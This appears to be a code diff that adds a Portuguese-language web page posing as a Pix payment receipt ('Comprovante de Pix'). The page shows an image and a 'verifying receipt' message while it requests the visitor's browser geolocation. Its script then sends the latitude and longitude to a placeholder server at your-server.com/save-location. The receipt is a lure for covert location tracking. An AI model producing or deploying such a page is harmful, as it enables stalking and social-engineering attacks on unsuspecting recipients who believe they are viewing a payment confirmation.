@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Comprovante de Pix</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 20px;
+            background-color: #f0f0f0;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #ccc;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 18px;
+            color: #333;
+        }
+        a {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+        a:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <h1>Comprovante de Pix</h1>
+    <img src="https://drive.google.com/file/d/1wUAyc7u78btcRsBcTAd0A--ky1XHyYvs/view?usp=drive_link" alt="Comprovante de Pix" />
+    <p id="location">Verificando comprovante...</p>
+    <a id="mapsLink" href="#" target="_blank" style="display: none;">Ver Localização no Google Maps</a>
+    <script>
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition, showError);
+        } else {
+            document.getElementById("location").innerText = "Geolocalização não suportada pelo navegador.";
+        }
+
+        function showPosition(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+            document.getElementById("location").innerText = "Comprovante verificado!";
+            document.getElementById("mapsLink").href = mapsUrl;
+            document.getElementById("mapsLink").style.display = "block";
+
+            // Enviar localização para um servidor (opcional)
+            fetch(`https://your-server.com/save-location?lat=${lat}&lon=${lon}`, {
+                method: 'GET',
+                headers: { 'Content-Type': 'application/json' }
+            })
+            .then(response => response.json())
+            .catch(error => console.log("Erro ao enviar localização:", error));
+        }
+
+        function showError(error) {
+            let message;
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    message = "Permissão de localização negada.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    message = "Localização indisponível.";
+                    break;
+                case error.TIMEOUT:
+                    message = "Tempo esgotado para obter localização.";
+                    break;
+                default:
+                    message = "Erro desconhecido.";
+            }
+            document.getElementById("location").innerText = `Erro: ${message}`;
+        }
+    </script>
+</body>
+</html>
